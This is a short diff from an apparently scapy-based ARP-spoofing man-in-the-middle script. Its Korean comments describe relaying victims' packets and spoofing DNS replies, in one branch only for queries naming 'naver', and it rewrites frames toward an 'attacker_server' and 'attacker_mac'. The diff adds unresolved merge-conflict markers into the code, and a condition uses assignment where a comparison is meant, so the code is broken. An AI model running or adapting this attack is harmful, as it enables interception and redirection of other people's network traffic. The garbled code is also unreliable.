@@ -92,6 +92,7 @@ def arp_monitor_callback(pkt):
 	else:
 		#ARP외의 모든 패킷 RELAY
 		if pkt[IP].src==des_ip:
+<<<<<<< HEAD
 			if pkt[IP].dst == attacker_server:
 				if pkt.haslayer(TCP) and pkt.getlayer(TCP).dport = "9991":
 					pkt[Ether].src = attacker_mac
@@ -108,6 +109,10 @@ def arp_monitor_callback(pkt):
 					sys.exit(1)
 			#if (pkt.haslayer(DNS)) and  (dns_count < 10) :
 			if (pkt.haslayer(DNS)) and  (str(pkt.getlayer(DNS).qd.qname).find("naver") >= 0) and dns_count < 10 :
+=======
+			# 10번만 dns spoofing 함 
+			if (pkt.haslayer(DNS)) and  (dns_count < 10) :
+>>>>>>> cf1feb233576b14fe732eb096365cadbc7366879
 				ip = pkt.getlayer(IP)
 				udp = ip.payload
 				dns = pkt.getlayer(DNS)
